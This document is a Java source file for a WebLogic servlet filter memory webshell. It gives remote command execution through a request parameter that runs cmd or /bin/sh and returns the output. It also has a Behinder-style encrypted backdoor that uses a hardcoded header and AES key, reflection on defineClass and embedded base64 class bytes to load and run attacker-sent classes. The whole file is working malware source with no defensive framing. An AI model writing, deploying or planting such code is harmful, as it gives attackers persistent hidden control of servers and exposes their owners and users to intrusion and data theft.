package Shell;

import sun.misc.BASE64Decoder;
import javax.crypto.Cipher;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Scanner;

public class WeblogicFilterShell implements Filter {

    private Class myClassLoaderClazz;
    private String basicCmd = "pass";
    private String behinderShellHeader = "D0g3";
    private String behinderShellPwd = "b9ecd0aebe82a741"; // Crilwa

    public WeblogicFilterShell() {
        super();
        initialize();
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        if(servletRequest.getParameter("type") != null && servletRequest.getParameter("type").equals("basic")){
            //basic cmd shell
            String cmd = servletRequest.getParameter(basicCmd);
            if(cmd != null && !cmd.isEmpty()){
                String[] cmds = null;
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    cmds = new String[]{"cmd", "/C", cmd};
                }else{
                    cmds = new String[]{"/bin/sh", "-c", cmd};
                }
                String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                servletResponse.getWriter().println(result);
            }
        }else if(((HttpServletRequest)servletRequest).getHeader(behinderShellHeader) != null&&(((HttpServletRequest)servletRequest).getMethod().equals("POST"))){
            //behind4 shell
            try{
                String k = behinderShellPwd;
                HttpSession session = ((HttpServletRequest)servletRequest).getSession();
                session.putValue("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), "AES"));

                HashMap map = new HashMap();
                map.put("request", servletRequest);
                map.put("response", servletResponse);
                map.put("session", session);

                //取classloader
                byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
                ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();
                Class Lclass = null;
                if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Lclass = cl.getClass().getSuperclass();
                } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Lclass = cl.getClass().getSuperclass().getSuperclass();
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                } else {
                    Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                }
                java.lang.reflect.Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                define.setAccessible(true);
                Class uclass = null;
                try{
                    uclass = cl.loadClass("U");
                }catch(ClassNotFoundException e){
                    uclass  = (Class)define.invoke(cl,bytecode,0,bytecode.length);
                }

                Constructor constructor =  uclass.getDeclaredConstructor(ClassLoader.class);
                constructor.setAccessible(true);
                Object u = constructor.newInstance(this.getClass().getClassLoader());
                Method Um = uclass.getDeclaredMethod("g",byte[].class);
                Um.setAccessible(true);

                //冰蝎payload
                byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(servletRequest.getReader().readLine()));
                Class evilclass = (Class) Um.invoke(u,evilClassBytes);
                Object a = evilclass.newInstance();
                Method b = evilclass.getDeclaredMethod("equals",Object.class);
                b.setAccessible(true);
                b.invoke(a, map);
            }catch(Exception e){
                // pass
            }
        }else{
            filterChain.doFilter(servletRequest, servletResponse);
        }

    }

    @Override
    public void destroy() {

    }

    private void initialize() {
        try{
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            try{
                this.myClassLoaderClazz = classLoader.loadClass("Util.MyClassLoader");
            } catch (ClassNotFoundException e) {
                String code = "yv66vgAAADIAGwoABQAWBwAXCgACABYKAAIAGAcAGQEABjxpbml0PgEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAClMY29tL2ZlaWhvbmcvbGRhcC90ZW1wbGF0ZS9NeUNsYXNzTG9hZGVyOwEAAWMBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAC2RlZmluZUNsYXNzAQAsKFtCTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspTGphdmEvbGFuZy9DbGFzczsBAAVieXRlcwEAAltCAQALY2xhc3NMb2FkZXIBAApTb3VyY2VGaWxlAQASTXlDbGFzc0xvYWRlci5qYXZhDAAGAAcBACdjb20vZmVpaG9uZy9sZGFwL3RlbXBsYXRlL015Q2xhc3NMb2FkZXIMAA8AGgEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7ACEAAgAFAAAAAAACAAAABgAHAAEACAAAADoAAgACAAAABiortwABsQAAAAIACQAAAAYAAQAAAAQACgAAABYAAgAAAAYACwAMAAAAAAAGAA0ADgABAAkADwAQAAEACAAAAEQABAACAAAAELsAAlkrtwADKgMqvrYABLAAAAACAAkAAAAGAAEAAAAIAAoAAAAWAAIAAAAQABEAEgAAAAAAEAATAA4AAQABABQAAAACABU=";
                byte[] bytes = new BASE64Decoder().decodeBuffer(code);
                Method method = null;
                try {
                    method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    method.setAccessible(true);
                    this.myClassLoaderClazz = (Class) method.invoke(classLoader, bytes, 0, bytes.length);
                } catch (NoSuchMethodException ex) {
                    ex.printStackTrace();
                }
            }
        } catch (Exception e) {
            // pass
        }
    }
}
